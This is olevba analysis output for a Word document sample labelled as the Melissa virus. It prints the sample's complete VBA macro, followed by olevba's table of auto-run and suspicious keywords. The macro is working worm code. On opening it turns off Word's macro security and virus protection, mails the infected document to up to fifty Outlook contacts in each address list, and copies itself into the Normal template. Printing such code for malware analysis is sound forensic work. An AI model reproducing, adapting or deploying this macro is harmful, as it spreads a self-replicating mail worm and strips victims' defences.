olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa-8e9014f77db6fd5248b556bf68d5c8c1ff91284b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Melissa-8e9014f77db6fd5248b556bf68d5c8c1ff91284b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
' this is a test
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Dim test1Outlook, test1MapiName, test1macro
Set test1Outlook = CreateObject("Outlook.Application")
Set test1MapiName = test1Outlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "This is a macro test!") <> "... by Anyone" Then
If test1Outlook = "Outlook" Then
test1MapiName.Logon "profile", "password"
    For y = 1 To test1MapiName.AddressLists.Count
        Set AddrBook = test1MapiName.AddressLists(y)
        x = 1
        Set test1macro = test1Outlook.CreateItem(0)
        For loop1 = 1 To AddrBook.AddressEntries.Count
            test4 = AddrBook.AddressEntries(x)
            test1macro.Recipients.Add test4
            x = x + 1
            If x > 50 Then loop1 = AddrBook.AddressEntries.Count
         Next loop1
         test1macro.Subject = "This is a test " & Application.UserName
         test1macro.Body = "Here is the e-mail body."
         test1macro.Attachments.Add ActiveDocument.FullName
         test1macro.Send
         test4 = ""
    Next y
test1MapiName.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "This is a macro test!") = "... by Anyone"
End If
Set actd1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set actn1 = NormalTemplate.VBProject.VBComponents.Item(1)
actnCL = actn1.CodeModule.CountOfLines
actdCL = actd1.CodeModule.CountOfLines
BGN = 2
If actd1.Name <> "Hello" Then
If actdCL > 0 Then _
actd1.CodeModule.DeleteLines 1, actdCL
Set Totest = actd1
actd1.Name = "Hello"
DoAD = True
End If
If actn1.Name <> "Hello" Then
If actnCL > 0 Then _
actn1.CodeModule.DeleteLines 1, actnCL
Set Totest = actn1
actn1.Name = "Hello"
DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CoverYA
If DoNT = True Then
Do While actd1.CodeModule.Lines(1, 1) = ""
actd1.CodeModule.DeleteLines 1
Loop
Totest.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While actd1.CodeModule.Lines(BGN, 1) <> ""
Totest.CodeModule.InsertLines BGN, actd1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
If DoAD = True Then
Do While actn1.CodeModule.Lines(1, 1) = ""
actn1.CodeModule.DeleteLines 1
Loop
Totest.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While actn1.CodeModule.Lines(BGN, 1) <> ""
Totest.CodeModule.InsertLines BGN, actn1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
CoverYA:
If actnCL <> 0 And actdCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
If Day(Now) = Minute(Now) Then Selection.TypeText " The macro still works, even with NAV updates."
End Sub











+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

